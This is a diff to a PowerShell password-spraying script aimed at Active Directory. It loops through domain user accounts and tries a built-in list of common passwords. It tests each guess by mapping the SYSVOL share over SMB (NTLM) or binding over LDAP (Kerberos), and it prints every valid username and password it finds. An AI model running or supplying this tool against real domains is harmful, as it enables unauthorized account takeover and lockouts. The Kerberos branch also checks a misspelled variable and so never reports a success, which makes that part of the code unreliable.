@@ -11,6 +11,8 @@ $DomainDCIP = $DomainDCInfo.IPv4Address
 [array]$DomainInfo = Get-ADDomain -Server $DomainDC
 $DomainInfoDNS = $DomainInfo.DNSRoot
 
+$RemotePath = "\\$DomainInfoDNS\SYSVOL"
+
 IF (!$PasswordFile)
  { [array]$PasswordArray = @('Password99!','ThisIsASecurePassword!','Password1234!') }
 IF ($PasswordFile)
@@ -24,27 +26,36 @@ ForEach ($PasswordArrayItem in $PasswordArray)
      {
         $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName
 
+        Write-Host "Password spraying username $($UserAccountArrayItem.SamAccountName) with password $PasswordArrayItem"
+
         IF ($AuthType -eq 'NTLM')
-          { $RemotePath = "\\$DomainDCIP\SYSVOL" }
-        IF ($AuthType -eq 'Kerberos')
-          { $RemotePath = "\\$DomainInfoDNS\SYSVOL" }
-
-        $Command  = "cmd /c Net Use z: $RemotePath $PasswordArrayItem /user:$username /persistent:no"
-        Write-Output "Attempting authentication for Account $username with Password $PasswordArrayItem "
-        TRY
-         { 
-            $CommandOutput = Invoke-Expression $Command -ErrorAction Stop
-           # Write-Output "Password for $username is $PasswordArrayItem" 
-         }
-        CATCH
-         { Write-Host "Password is incorrect" }
-
-         TRY
-          {
-             $CommandDel = "cmd /c net use Z: /Delete"
-             Invoke-Expression $CommandDel -ErrorAction Stop
+          { 
+            TRY
+             {
+                $output = @()
+                $password = ConvertTo-SecureString $PasswordArrayItem -AsPlainText -Force
+                $cred = New-Object System.Management.Automation.PSCredential($username, $password)
+                $output = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
+                Remove-SmbMapping -RemotePath $RemotePath -Force
+                IF ($output)
+                 { write-host "$($UserAccountArrayItem.SamAccountName) Password is $PasswordArrayItem" -ForegroundColor Cyan }
+             }
+            CATCH
+             { write-verbose "Password is incorrect" }
           }
-         CATCH {}
+        
+        IF ($AuthType -eq 'Kerberos')
+          { 
+            TRY
+             { 
+                $output = @()
+                $Ouput = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
+                IF ($output)
+                 { write-host "$($UserAccountArrayItem.SamAccountName) Password is $PasswordArrayItem" -ForegroundColor Cyan }
+             }
+            CATCH 
+             { write-verbose "Password is incorrect" }
+          }
      }
     # Start-Sleep -Seconds 300
  }
